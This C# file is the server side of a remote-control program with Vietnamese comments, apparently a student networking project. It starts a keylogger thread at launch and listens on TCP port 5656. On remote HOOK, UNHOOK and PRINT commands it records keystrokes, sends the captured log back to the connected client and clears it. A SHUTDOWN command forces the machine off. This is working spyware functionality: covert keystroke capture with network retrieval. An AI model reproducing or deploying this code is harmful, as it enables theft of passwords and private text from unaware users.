// File: server.cs (Logic chính của Server)
using KeyLogger; // Thêm tham chiếu đến KeyLogger namespace
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace server
{
    public partial class server : Form
    {
        // Thread để chạy Keylogger
        private Thread tklog;

        public server()
        {
            InitializeComponent();

            // Khởi tạo Keylogger Thread ngay khi Server khởi động
            tklog = new Thread(new ThreadStart(KeyLogger.InterceptKeys.startKLog));
            tklog.Start();
            // Ban đầu keylogger sẽ chạy nhưng cờ IsKeyLoggingActive = false, 
            // nên nó không ghi phím cho đến khi nhận lệnh "HOOK"
        }

        // Hàm nhận tín hiệu (Đã có trong file gốc)
        public void receiveSignal(ref String? s)
        {

            try
            {
                if (Program.nr != null)
                    s = Program.nr.ReadLine();
            }
            catch (Exception)
            {
                s = "QUIT";
            }
        }

        // --- Hàm Shutdown (Chức năng 6) ---
        public void shutdown()
        {
            try
            {
                // -s: Tắt máy | -t 0: Tắt ngay lập tức | -f: Ép buộc (Force)
                System.Diagnostics.Process.Start("ShutDown", "-s -t 0 -f");
            }
            catch (Exception ex)
            {
                // Log hoặc hiển thị lỗi
            }
        }

        // --- Hàm Keylog (Chức năng 4) ---
        public void keylog()
        {
            String? s = "";

            // Vòng lặp chờ lệnh HOOK/UNHOOK/PRINT/QUIT
            while (true)
            {
                receiveSignal(ref s);
                switch (s)
                {
                    case "HOOK":
                        // Bật cờ ghi log
                        KeyLogger.appstart.IsKeyLoggingActive = true;
                        // Xóa log cũ
                        File.WriteAllText(KeyLogger.appstart.path, string.Empty);
                        break;
                    case "UNHOOK":
                        // Tắt cờ ghi log
                        KeyLogger.appstart.IsKeyLoggingActive = false;
                        break;
                    case "PRINT":
                        printkeys(); // Gửi log về Client
                        break;
                    case "QUIT":
                        return; // Thoát khỏi vòng lặp keylog
                }
            }
        }

        // --- Hàm Gửi Log về Client ---
        public void printkeys()
        {
            String s = "";
            try
            {
                // Đọc toàn bộ nội dung file log
                s = File.ReadAllText(KeyLogger.appstart.path);
                // Xóa nội dung file log sau khi đọc
                File.WriteAllText(KeyLogger.appstart.path, string.Empty);
                if (Program.nw != null)
                {
                    // Gửi nội dung qua mạng
                    Program.nw.Write(s);
                    Program.nw.Flush();
                }
            }
            catch (FileNotFoundException)
            {
                if (Program.nw != null)
                {

                    // Nếu file chưa tồn tại (chưa có log), gửi chuỗi rỗng
                    Program.nw.Write("");
                    Program.nw.Flush();
                }
            }
            catch (Exception)
            {
                // Xử lý lỗi mạng/I/O
            }
        }

        // Hàm xử lý kết nối chính (button1_Click) (Đã có trong file gốc)
        private void button1_Click(object sender, EventArgs e)
        {
            IPEndPoint ip = new IPEndPoint(IPAddress.Any, 5656);
            Program.server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            Program.server.Bind(ip);
            Program.server.Listen(100);

            Program.client = Program.server.Accept();
            Program.ns = new NetworkStream(Program.client);
            Program.nr = new StreamReader(Program.ns);
            Program.nw = new StreamWriter(Program.ns);

            // Logic khởi tạo Socket, Bind, Listen, Accept và Stream
            // (Giả định Program.server, Program.client, Program.nw, Program.nr đã được thiết lập)
            lblStatus.Text = "Trạng thái: Đang mở";
            lblStatus.ForeColor = Color.Green;

            String? s = "";
            while (true)
            {
                receiveSignal(ref s);
                switch (s)
                {
                    case "KEYLOG": keylog(); break; // Vào chế độ Keylog
                    case "SHUTDOWN": shutdown(); break; // Tắt máy
                    // ... các case khác (PROCESS, APPLICATION, etc.)
                    case "QUIT": goto finish;
                }
            }

        finish:
            // Đóng kết nối
            if (Program.client != null && Program.server != null)
            {
                Program.client.Shutdown(SocketShutdown.Both);
                Program.client.Close();
                Program.server.Close();
            }

            // Dừng Thread Keylogger hoàn toàn khi Server đóng
            KeyLogger.InterceptKeys.stopKLog();
            tklog.Abort(); // Dừng Thread một cách không an toàn (nên dùng cờ hơn)
        }
    }
}